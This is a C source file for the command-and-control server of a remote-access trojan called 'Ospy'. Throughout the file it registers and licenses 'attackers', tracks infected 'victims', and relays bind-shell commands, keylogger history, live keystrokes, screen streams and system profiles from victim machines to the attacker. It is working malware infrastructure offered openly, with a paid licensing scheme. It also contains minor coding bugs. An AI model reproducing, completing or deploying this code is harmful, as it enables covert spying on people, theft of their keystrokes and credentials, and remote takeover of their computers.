#include "entering_to_Ospy.h"
#include "connection.h"

void remove_new_lines(char (* input)[]){
	char * new_line_less_str = (char *) malloc(strlen(*input));
	int counter = 0;
	for (int i = 0; i < strlen(*input); i++) {
		if((*input)[i] != '\n'){
			new_line_less_str[counter++] = (*input)[i];
		}
	}
	new_line_less_str[++counter] = '\0';
	strcpy(*input, new_line_less_str);
}


void send_to_attacker_connected_victims (client attacker){
	int num_of_connected_victims = 0;
	char connected_victims[MAX_VICTIMS_PER_ATTACKER][MAX_INPUT_LEN];
	
	for (int i = 0;  i < MAX_VICTIMS_PER_ATTACKER; i++){
		memset(connected_victims[i], '\0', MAX_INPUT_LEN);
	}
	for (int curr_client_index = 0; curr_client_index < MAX_CLIENTS && num_of_connected_victims < MAX_VICTIMS_PER_ATTACKER; curr_client_index++) {
		if (strcmp(clients_list[curr_client_index].id, md5((unsigned char *) attacker.id, strlen(attacker.id))) == 0 && clients_list[curr_client_index].i_am == VICTIM){
			strtok(clients_list[curr_client_index].name, "\n"); // if exist,remove the '\n'
			strcpy(connected_victims[num_of_connected_victims++], clients_list[curr_client_index].name);
		}
	}
	send(attacker.socket_fd, &connected_victims, sizeof(connected_victims), 0);
}

int main (){
	FILE * events_log = fopen("events_log.log", "a");
	if (events_log == NULL){
		printf("Can't opening log file\n");
	}
	time_t time_function = time(NULL);
	char * curr_time;
	curr_time = asctime(localtime(&time_function)); // time function
	fprintf(events_log, "Ospy server started at : %s", curr_time);
	fflush(events_log);
		
	srand (time(0)); // make the random funtion real random
	
	initialize_connection (); 
	
	encrypted_general_message_protocol message;
	registration_status registering_final_status;
	STATUS loging_in_status;
	licenses_key_item licenses_key;
	
	while (1) {
		time_function = time(NULL);
		curr_time = asctime(localtime(&time_function));	
		strtok(curr_time, "\n");
		//clear the socket set 
		FD_ZERO(&readfds);
		
		//add master socket to set
		FD_SET(master_socket, &readfds); 
		max_socket_descriptor = master_socket;
	
		add_child_sockets_to_set();
			
		//wait for an activity on one of the sockets, timeout is NULL, so wait indefinitely 
		activity = select( max_socket_descriptor + 1 , &readfds , NULL , NULL , NULL); 
		if ((activity < 0) && (errno != EINTR)) 
			fprintf(events_log, "%s : select error", curr_time);
			fflush(events_log);
				
		//If something happened on the master socket, then its an incoming connection 
		if (FD_ISSET(master_socket, &readfds)) { 
			if ((new_socket = accept(master_socket, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) { 
				fprintf(events_log, "%s : accept error", curr_time);
				fflush(events_log);
				exit(EXIT_FAILURE);
				
			}
			//inform user of socket number - used in send and receive commands 
			fprintf(events_log,"%s : New connection , socket fd is %d , ip is : %s , port : %d\n",curr_time, new_socket, inet_ntoa(address.sin_addr) , ntohs (address.sin_port));
			fflush(events_log);
			//add new socket to array of sockets 
			for (int i = 0; i < MAX_CLIENTS; i++){ 
				//if position is empty
				if( clients_list[i].socket_fd == 0 ) { 
					clients_list[i].socket_fd = new_socket; 
					//printf("Adding to list of sockets as %d\n" , i); 
					fprintf(events_log, "%s : Adding to list of sockets as %d\n", curr_time, i);
					fflush(events_log);
					break; 
				}
			}
		}
		
		//else its some IO operation on some other socket 
		for (int i = 0; i < MAX_CLIENTS; i++) {
			socket_descriptor = clients_list[i].socket_fd;
			if (FD_ISSET( socket_descriptor , &readfds)) {
				//Check if it was for closing , and also read the incoming message
				if (read(socket_descriptor, &message, sizeof(encrypted_general_message_protocol)) == 0) { 
					//Somebody disconnected , get his details and print
					getpeername(socket_descriptor , (struct sockaddr*)&address ,(socklen_t*)&addrlen); 
					fprintf(events_log,"%s : Host disconnected, ip %s , port %d \n",curr_time, inet_ntoa(address.sin_addr), ntohs(address.sin_port)); 
					fflush(events_log);
					
					//Close the socket and mark as 0 in list for urses 
					close(socket_descriptor); 
					clients_list[i].socket_fd = 0; 
					clients_list[i].other_side_sfd = 0;
					memset(clients_list[i].id, '\0', strlen(clients_list[i].id));
					memset(clients_list[i].name, '\0', strlen(clients_list[i].name));
				}
				else {
					if (message.i_am == ATTACKER){
						switch (message.action) {
							case LOG_IN :
								loging_in_status = log_in_attacker(decrypt_text(message.data.encrypted_login_to_Ospy.username, AES_KEY), decrypt_text(message.data.encrypted_login_to_Ospy.password, AES_KEY));
								send(socket_descriptor, &loging_in_status, sizeof(registration_status), 0);
								if (loging_in_status == SUCCESS){// if attacker loged in -connect he's id the hes socket descriptor
									strcpy(clients_list[i].id, decrypt_text(message.data.encrypted_login_to_Ospy.username, AES_KEY)); // set attackers id = user name
									clients_list[i].i_am = ATTACKER; // declare this client as attacker
								}
								
								break;
								
							case REGISTER :
								registering_final_status = register_new_attacker(message.data.encrypted_register_to_Ospay.license_key, decrypt_text(message.data.encrypted_register_to_Ospay.username, AES_KEY), decrypt_text(message.data.encrypted_register_to_Ospay.password, AES_KEY));
								
								send(socket_descriptor, &registering_final_status, sizeof(registration_status),0);
								
								break;
								
							case BUY_LICENSE_KEY :
								licenses_key = add_new_license_key();
								send(socket_descriptor, &licenses_key, sizeof(licenses_key_item),0);
							
								break;
							
							case GET_CONNECTED_VICTM :
								send_to_attacker_connected_victims(clients_list[i]);
								
								break;
								
							case SELECT_VICTIM :
								set_attacker_victim_connection (&clients_list[i], message.data.selected_victim_name); 								
								break;
								
							case SEND_BIND_SHELL_COMMAND :
								send(clients_list[i].other_side_sfd, &message.action, sizeof(message.action), 0);
								send(clients_list[i].other_side_sfd, &message.data.bind_shell_command, sizeof(message.data.bind_shell_command), 0);
								
								break;
								
							default :
								printf("%d",message.action);
								send(clients_list[i].other_side_sfd, &message.action, sizeof(message.action), 0);
								break;	
						}
					}
					else if (message.i_am == VICTIM){
						switch (message.action){
							case LOG_IN :
								strcpy(clients_list[i].name, decrypt_text(message.data.encrypted_login_vicim_to_Ospy.victim_name, AES_KEY));
								strcpy(clients_list[i].id, message.data.encrypted_login_vicim_to_Ospy.id);
								clients_list[i].i_am = VICTIM;
								
								break;
								
							// all these options result in sending back a file to the attacker. the server does nothing more than forwarding it to the right attacker
							case GET_KEYLOGGER_HISTORY :
							case GET_SYSTEM_PROFILER :
							case GET_SCREEN_STREAM :
							case SEND_BIND_SHELL_COMMAND :
								send(clients_list[i].other_side_sfd, &message.data.file_data, sizeof(message.data.file_data), 0);
								
								break;
								
							case GET_KEYSTROKES_STREAM :
								//printf("\n%s",message.data.keylogger_stream_key);
								send(clients_list[i].other_side_sfd, message.data.keylogger_stream_key, sizeof(message.data.keylogger_stream_key), 0);
								
								break;	
								
							default :
								
								break;	
						}
					}
				} 
			} 
		} 
	}
	fclose(events_log);
	return 0; 
}